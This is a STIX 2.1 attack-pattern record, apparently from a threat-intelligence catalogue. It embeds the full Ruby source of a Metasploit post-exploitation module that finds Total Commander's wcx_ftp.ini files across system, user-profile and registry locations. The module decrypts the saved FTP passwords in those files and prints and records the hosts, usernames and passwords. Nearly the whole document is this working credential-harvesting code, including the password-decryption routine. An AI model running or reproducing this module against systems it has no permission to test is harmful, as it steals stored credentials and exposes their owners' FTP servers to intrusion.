{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9bf68738-a1ed-4987-be6d-65eb07ff267f",
    "created": "2024-08-14T16:33:08.251279Z",
    "modified": "2024-08-14T16:33:08.251283Z",
    "name": "Windows Gather Total Commander Saved Password Extraction",
    "description": " This module extracts weakly encrypted saved FTP Passwords from Total Commander. It finds saved FTP connections in the wcx_ftp.ini file.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/total_commander.rb",
            "external_id": "total_commander.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Total Commander Saved Password Extraction',\n        'Description' => %q{\n          This module extracts weakly encrypted saved FTP Passwords from Total Commander.\n          It finds saved FTP connections in the wcx_ftp.ini file.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'theLightCosine'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    print_status('Checking Default Locations...')\n    check_systemroot\n\n    grab_user_profiles.each do |user|\n      next if user['AppData'].nil?\n      next if user['ProfileDir'].nil?\n\n      check_userdir(user['ProfileDir'])\n      check_appdata(user['AppData'])\n    end\n\n    commander_key = 'HKLM\\\\Software\\\\Ghisler\\\\Total Commander'\n    hklmpath = registry_getvaldata(commander_key, 'FtpIniName')\n    case hklmpath\n    when nil\n      print_status('Total Commander Does not Appear to be Installed Globally')\n    when 'wcx_ftp.ini'\n      print_status('Already Checked SYSTEMROOT')\n    when '.\\\\wcx_ftp.ini'\n      hklminstpath = registry_getvaldata(commander_key, 'InstallDir') || ''\n      if hklminstpath.empty?\n        print_error('Unable to find InstallDir in registry, skipping wcx_ftp.ini')\n      else\n        check_other(hklminstpath + '\\\\wcx_ftp.ini')\n      end\n    when /APPDATA/\n      print_status('Already Checked AppData')\n    when /USERPROFILE/\n      print_status('Already Checked USERPROFILE')\n    else\n      check_other(hklmpath)\n    end\n\n    userhives = load_missing_hives\n    userhives.each do |hive|\n      next if hive['HKU'].nil?\n\n      print_status(\"Looking at Key #{hive['HKU']}\")\n      profile_commander_key = \"#{hive['HKU']}\\\\Software\\\\Ghisler\\\\Total Commander\"\n      hkupath = registry_getvaldata(profile_commander_key, 'FtpIniName')\n      print_status(\"HKUP: #{hkupath}\")\n      case hkupath\n      when nil\n        print_status('Total Commander Does not Appear to be Installed on This User')\n      when 'wcx_ftp.ini'\n        print_status('Already Checked SYSTEMROOT')\n      when '.\\\\wcx_ftp.ini'\n        hklminstpath = registry_getvaldata(profile_commander_key, 'InstallDir') || ''\n        if hklminstpath.empty?\n          print_error('Unable to find InstallDir in registry, skipping wcx_ftp.ini')\n        else\n          check_other(hklminstpath + '\\\\wcx_ftp.ini')\n        end\n      when /APPDATA/\n        print_status('Already Checked AppData')\n\n      when /USERPROFILE/\n        print_status('Already Checked USERPROFILE')\n      else\n        check_other(hkupath)\n      end\n    end\n    unload_our_hives(userhives)\n  end\n\n  def check_userdir(path)\n    filename = \"#{path}\\\\wcx_ftp.ini\"\n    check_other(filename)\n  end\n\n  def check_appdata(path)\n    filename = \"#{path}\\\\GHISLER\\\\wcx_ftp.ini\"\n    check_other(filename)\n  end\n\n  def check_systemroot\n    winpath = expand_path('%SYSTEMROOT%\\\\wcx_ftp.ini')\n    check_other(winpath)\n  end\n\n  def check_other(filename)\n    if file?(filename)\n      print_status(\"Found File at #{filename}\")\n      get_ini(filename)\n    else\n      print_status(\"#{filename} not found ....\")\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: fullname,\n      post_reference_name: refname,\n      session_id: session_db_id,\n      origin_type: :session,\n      private_data: opts[:password],\n      private_type: :password,\n      username: opts[:user]\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def get_ini(filename)\n    config = client.fs.file.new(filename, 'r')\n    parse = config.read\n    ini = Rex::Parser::Ini.from_s(parse)\n\n    ini.each_key do |group|\n      next if (group == 'General') || (group == 'default') || (group == 'connections')\n\n      print_status(\"Processing Saved Session #{group}\")\n      host = ini[group]['host']\n\n      username = ini[group]['username']\n      passwd = ini[group]['password']\n      next if passwd.nil?\n\n      passwd = decrypt(passwd)\n      (host, port) = host.split(':')\n      port = 21 if port.nil?\n      print_good(\"*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***\")\n      if session.db_record\n        source_id = session.db_record.id\n      else\n        source_id = nil\n      end\n\n      report_cred(\n        ip: host,\n        port: port,\n        service_name: 'ftp',\n        user: username,\n        password: passwd\n      )\n    end\n  end\n\n  def seed(nMax)\n    @vseed = ((@vseed * 0x8088405) & 0xffffffff) + 1\n    return (((@vseed * nMax) >> 32) & 0xffffffff)\n  end\n\n  def shift(n1, n2)\n    first = (n1 << n2) & 0xffffffff\n    second = (n1 >> (8 - n2)) & 0xffffffff\n    retval = (first | second) & 0xff\n    return retval\n  end\n\n  def decrypt(pwd)\n    pwd2 = []\n\n    pwd.scan(/../) { |a| pwd2 << (a.to_i 16) }\n\n    len = pwd2.length - 4\n\n    pwd3 = []\n    @vseed = 849521\n    pwd2.each do |a|\n      blah = seed(8)\n      blah2 = shift(a, blah)\n      pwd3 << blah2\n    end\n\n    @vseed = 12345\n    256.times do |_i|\n      a = seed(len)\n      b = seed(len)\n      t = pwd3[a]\n      pwd3[a] = pwd3[b]\n      pwd3[b] = t\n    end\n\n    @vseed = 42340\n    (0..len).each do |i|\n      pwd3[i] = (pwd3[i] ^ seed(256)) & 0xff\n    end\n\n    @vseed = 54321\n    (0..len).each do |i|\n      foo = seed(256)\n      pwd3[i] = (pwd3[i] - foo) & 0xff\n    end\n\n    fpwd = ''\n    pwd3[0, len].map { |a| fpwd << a.chr }\n    return fpwd\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}